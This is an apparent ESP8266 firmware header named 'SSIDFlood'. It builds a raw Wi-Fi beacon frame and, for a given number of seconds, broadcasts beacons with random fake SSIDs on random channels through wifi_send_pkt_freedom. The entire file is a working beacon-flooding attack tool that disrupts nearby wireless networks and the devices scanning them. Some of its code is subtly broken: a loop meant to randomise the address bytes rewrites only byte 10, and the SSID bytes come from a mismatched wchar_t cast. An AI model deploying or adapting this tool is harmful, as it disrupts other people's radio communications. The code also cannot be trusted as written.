/*
 * Dijelovi koda preuzeti sa sljedeÄ‡ih izvora:
 * https://github.com/kripthor/WiFiBeaconJam
 * */

#ifndef SSIDFLOOD_H_
#define SSIDFLOOD_H_
#include "sdk.h"
#include <ESP8266WiFi.h>

namespace SSIDFlood {

byte channel;

uint8_t packet[] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
		0xc0, 0x6c, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0x64, 0x00,
		0x01, 0x04, 0x00, 0x20, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
		0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
		0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
		0x04 };

void enablePromiscousMode() {
	wifi_set_opmode(STATION_MODE);
	wifi_promiscuous_enable(1);
}

int startFlooding(int time) {
	enablePromiscousMode();
	int timeInMs = time * 1000;
	while (timeInMs) {
		channel = random(1, 12);
		wifi_set_channel(channel);

		for (int i = 10; i < 22; i++) {
			packet[10] = random(256);
		}

		for (int i = 38; i < 70; i++) {
			packet[i] = wchar_t(random(65480));
		}

		packet[82] = channel;

		wifi_send_pkt_freedom(packet, 83, 0);

		timeInMs -= 1;
		delay(1);
	}

	return 1;
}

}

#endif /* SSIDFLOOD_H_ */
